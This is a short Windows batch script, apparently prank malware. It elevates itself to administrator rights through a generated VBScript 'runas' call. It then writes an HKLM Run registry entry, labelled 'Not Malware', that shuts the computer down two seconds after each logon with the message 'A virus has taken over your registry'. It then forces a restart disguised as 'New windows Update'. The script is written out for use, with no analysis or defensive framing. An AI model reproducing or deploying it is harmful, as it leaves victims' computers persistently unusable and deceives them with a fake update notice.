@echo off
if _%1_==_payload_  goto :payload

:getadmin
    echo %~nx0: elevating self
    set vbs=%temp%\getadmin.vbs
    echo Set UAC = CreateObject^("Shell.Application"^)                >> "%vbs%"
    echo UAC.ShellExecute "%~s0", "payload %~sdp0 %*", "", "runas", 1 >> "%vbs%"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
goto :eof

:payload

::ENTER YOUR CODE BELOW::   
reg add HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Run /f /v "Not Malware" /t "REG_SZ" /d "shutdown -s -t 2 -c \"A virus has taken over your registry"
@echo on

shutdown /r -t 5 -c "New windows Update

::END OF YOUR CODE::

echo.
echo...Script Complete....
echo.

pause
